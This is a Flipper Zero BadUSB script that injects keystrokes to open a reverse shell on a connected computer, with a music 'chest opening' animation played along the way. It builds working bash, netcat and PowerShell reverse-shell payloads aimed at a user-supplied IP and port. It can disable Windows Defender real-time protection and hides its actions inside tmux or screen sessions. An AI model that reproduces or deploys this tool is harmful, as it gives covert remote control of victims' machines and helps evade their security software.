// ------------------------------------------------------------------------------------------------------------
// This script will generate a reverse shell for you, asking for the IP and Port to connect to as well as
// the type of shell you want to generate and if you need to open a terminal window before sending the payload.
// shoutout to @jamisonderek for the speaker api.
// OS Supported: Linux, Mac, Windows
//
// At this stage I'm figuring out a way to bypass the Windows Defender and send a powershell payload.   
//
// By B3rt1ng, https://github.com/b3rt1ng
// ------------------------------------------------------------------------------------------------------------
let Speaker = ({
    _acquired : false,
    _acquire : ffi("int furi_hal_speaker_acquire(int)"),
    start : ffi("void furi_hal_speaker_start(float, float)"),
    stop : ffi("void furi_hal_speaker_stop()"),
    _release : ffi("void furi_hal_speaker_release()"),
    acquire : function(timeout) {
      if (!this._acquired) {
        this._acquired = this._acquire(timeout);
      }
      return this._acquired;
    },
    acquired : function() {
      return this._acquired;
    },
    release : function() {
      if (this._acquired) {
        this._release();
        this._acquired = false;
      }
    },
    play : function(frequency, volume, duration) {
      let already_acquired = this.acquired();
      if (!already_acquired) {
        this.acquire(1000);
      };
      if (this.acquired()) {
        this.start(frequency, volume);
        delay(duration);
        this.stop();
      }
      if (!already_acquired) {
        this.release();
      }
    },
  }
);

function play(note, duration, wait, octave){
    duration = duration * 1.5;
    wait = wait * 1.5;
    let notes = {"C": 261.63,"C#": 277.18,"D": 293.66,"D#": 311.13,"E": 329.63,"F": 349.23,"F#": 369.99,"G": 392.00,"G#": 415.30,"A": 440.00,"A#": 466.16,"B": 493.88};
    Speaker.play(notes[note]*(octave), 1, duration);
    delay(wait);
}

let loading_state = 0;
function chest_open() {
    if (loading_state === 0) {
        for (let i = 0; i < 2; i++) {play("G", 100, 0, 1);play("A", 100, 0, 1);play("B", 100, 0, 1);play("C#", 100, 0, 2);}
    } else if (loading_state === 1) {
        for (let i = 0; i < 2; i++) {play("G#", 95, 0, 1);play("A#", 95, 0, 1);play("C", 95, 0, 2);play("D", 95, 0, 2);}
    } else if (loading_state === 2) {
        for (let i = 0; i < 2; i++) {play("A", 90, 0, 0.5);play("B", 90, 0, 0.5);play("C#", 90, 0, 1);play("D#", 90, 0, 1);}
    } else if (loading_state === 3) {
        for (let i = 0; i < 2; i++) {play("A#", 85, 0, 0.5);play("C", 85, 0, 1);play("D", 85, 0, 1);play("E", 85, 0, 1);}
    } else if (loading_state === 4) {
        play("B", 80, 0, 0.5);play("C#", 80, 0, 1);play("D#", 80, 0, 1);play("F", 80, 0, 1);
    } else if (loading_state === 5) {
        play("C", 75, 0, 1);play("D", 75, 0, 1);play("E", 75, 0, 1);play("F#", 75, 0, 1);
    } else if (loading_state === 6) {
        play("C#", 70, 0, 1);play("D#", 70, 0, 1);play("F", 70, 0, 1);play("G", 70, 0, 1);
    } else if (loading_state === 7) {
        play("D", 65, 0, 1);play("E", 65, 0, 1);play("F#", 65, 0, 1);play("G#", 65, 0, 1);
    } else {
        delay(1000);
    }
}

function chest_loot() {
    play("A", 150, 0, 1);play("A#", 150, 0, 1);play("B", 150, 0, 1);play("C", 350, 0, 2);
}

let keyboard = require('keyboard');
let submenu = require("submenu");
let notify = require("notification");
let badusb = require("badusb");


keyboard.setHeader("Remote IP");
let ip = keyboard.text(100, "192.168.1.1", true);

keyboard.setHeader("Remote Port");
let port = keyboard.text(100, "4242", true);

submenu.setHeader("Select an OS");
submenu.addItem("-> Linux", 0);
submenu.addItem("-> Mac", 1);
submenu.addItem("-> Windows", 2);
let os = submenu.show();

let shellType = false;
if (os === 0 || os === 1) {
    submenu.setHeader("Select a shell type");
    submenu.addItem("-> bash", 0);
    submenu.addItem("-> shell", 1);
    submenu.addItem("-> netcat", 2);
    submenu.addItem("-> /bin/sh", 3);
    submenu.addItem("-> /bin/bash", 4);
} else if (os === 2) {
    submenu.setHeader("Select a shell type");
    submenu.addItem("-> powershell #1", 5);
    submenu.addItem("-> powershell #2", 6);
    submenu.addItem("-> powershell #3", 7);
}
shellType = submenu.show();
let disableDefender = 1;
if (os === 2) {
    submenu.setHeader("disable defender");
    submenu.addItem("-> Yes !", 0);
    submenu.addItem("-> No !", 1);
    disableDefender = submenu.show();
}

let command = "";
if (shellType === 0) { // a switch case implementation would come in handy :(
    command = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
} else if (shellType === 1) {
    command = "sh -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
} else if (shellType === 2) {
    command = "nc " + ip + " " + port + " -e /bin/bash";
} else if (shellType === 3) {
    command = "/bin/sh -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
} else if (shellType === 4) {
    command = "/bin/bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
} else if (shellType === 5) {
    command = "$LHOST = \"" + ip + "\"; $LPORT = " + port + "; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()";
} else if (shellType === 6) { // gui + r based
    command = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
} else if (shellType === 7) { // gui + r based
    command = "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('" + ip + "', " + port + ");$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()";
}

print("Reverse shell command:");
print(command);

let openTerminal = 1;
if (os === 0 || os === 1) {
    submenu.setHeader("open terminal");
    submenu.addItem("-> Yes !", 0);
    submenu.addItem("-> No !", 1);
    openTerminal = submenu.show();
}

submenu.setHeader("change layout"); // because i'm french and i need to change the layout to Azerty for example
submenu.addItem("-> Qwerty", 0);
submenu.addItem("-> Azerty", 1);
submenu.addItem("-> Azerty Mac", 3);
submenu.addItem("-> No !", 4);
let changeLayout = submenu.show();


// the following layout_path is only available on the dev firmware.
if (changeLayout === 0) {
    badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/en-US.kl"});
} else if (changeLayout === 1) {
    badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/fr-FR.kl"});
} else if (changeLayout === 3) {
    badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/fr-FR-mac.kl"});
} else {
    badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero"});
}

let hideActions = 2;
if (os === 0 || os === 1) {
    submenu.setHeader("Hide actions");
    // we will use some terminal multiplexer to hide the actions, choosing one of them will also make the script exit the terminal after the payload is sent.
    submenu.addItem("-> Tmux", 0);
    submenu.addItem("-> Screen", 1);
    submenu.addItem("-> No ! ", 2);
    hideActions = submenu.show();
}

print("waiting for connection...");
while (!badusb.isConnected()) {
    chest_open();
    loading_state++; // dont let the chest_open function run forever ig xd
}

notify.blink("blue", "short");
chest_open();

function defender_bypass() {
    print("disabling defender...");
    badusb.press("GUI", "r");
    delay(500);
    badusb.println("powershell", 10);
    delay(500);
    badusb.println("Set-MpPreference -DisableRealtimeMonitoring $true", 10);
    delay(500);
    badusb.press("ALT", "F4");
    delay(500);
}

if (shellType === 6 || shellType === 7) {
    if (disableDefender === 0) {defender_bypass();}
    print("sending powershell payload...");
    badusb.press("GUI", "r");
    delay(500);
    badusb.println("cmd", 10);
    delay(1000);
    badusb.println(command, 10);
    delay(500);
} else if (shellType === 5) {
    if (disableDefender === 0) {defender_bypass();}
    print("sending powershell payload...");
    badusb.press("GUI", "x");
    delay(300);
    badusb.press("i");
    delay(3000);
    badusb.println(command, 10);
} else {

    if (openTerminal === 0) {
        print("opening terminal...");
        badusb.press("CTRL", "ALT", "t");
        delay(1500);
    }

    print("sending payload...");
    if (hideActions === 0) {
        badusb.println("tmux new-session -d -s \"none\" \"" + command + "\"", 10);
        delay(500);
        badusb.press("ALT", "F4");
    } else if (hideActions === 1) {
        badusb.println("screen -d -m " + command, 10);
        delay(500);
        badusb.press("ALT", "F4");
    } else {
        badusb.println(command, 10);
    }
}

badusb.quit();
chest_loot();
notify.blink("green", "long");